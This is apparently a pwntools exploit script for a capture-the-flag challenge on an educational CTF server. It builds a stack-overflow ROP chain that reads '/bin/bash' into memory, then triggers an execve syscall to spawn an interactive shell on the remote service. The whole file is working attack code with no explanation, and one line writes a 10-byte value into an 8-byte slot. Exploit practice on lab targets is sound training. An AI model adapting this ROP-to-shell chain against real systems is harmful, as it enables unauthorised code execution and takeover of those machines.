import pwn
proc = pwn.remote("edu-ctf.zoolab.org", 10003)
#proc = pwn.remote("127.0.0.1", 8080)
#proc = pwn.process("share/chal")
read_addr   = 0x04470C0

shell = b"/bin/bash\x00"

pop_rax_ret = 0x0447b27
pop_rdi_ret = 0x0401e3f
pop_rsi_ret = 0x0409e6e
pop_rdx_rbx_ret = 0x047ed0b


payload = bytearray(pwn.cyclic(0x888))

payload[40:40+8] = (pop_rdi_ret).to_bytes(8, 'little')

payload[48:48+8] = (0).to_bytes(8, 'little') # stdin
payload[56:56+8] = (pop_rsi_ret).to_bytes(8, 'little')

payload[64:64+8] = (0x4c6000).to_bytes(8, 'little') # some addr on bss
payload[72:72+8] = (pop_rdx_rbx_ret).to_bytes(8, 'little')

payload[80:80+8] = (len(shell)+16).to_bytes(8, 'little') # /bin/bash\x00+argv
payload[88:88+8] = (0).to_bytes(10, 'little')
payload[96:96+8] = (read_addr).to_bytes(8, 'little')

payload[512:512+len(shell)] = shell
payload[512+len(shell):512+len(shell)+16] = (0x4c6000).to_bytes(8, 'little') + (0).to_bytes(8, 'little')

payload[104:104+8] = (pop_rdi_ret).to_bytes(8, 'little')

payload[112:112+8] = (0x4c6000).to_bytes(8, 'little')
payload[120:120+8] = (pop_rax_ret).to_bytes(8, "little")

payload[128:128+8] = (59).to_bytes(8, 'little')
payload[136:136+8] = (pop_rsi_ret).to_bytes(8, 'little')

payload[144:144+8] = (0x4c6000 + len(shell)).to_bytes(8, 'little')
payload[152:152+8] = (pop_rdx_rbx_ret).to_bytes(8, 'little')

payload[160:160+8] = b'\x00'*8
payload[168:168+8] = b'\x00'*8
payload[176:176+8] = (0x044710A).to_bytes(8, 'little')

cmd = b"\x00"
payload[538:] = cmd
input()
#payload[536:536+len(cmd)] = cmd
proc.send(payload)
proc.interactive()
#open("exp.pay", "wb").write(payload)
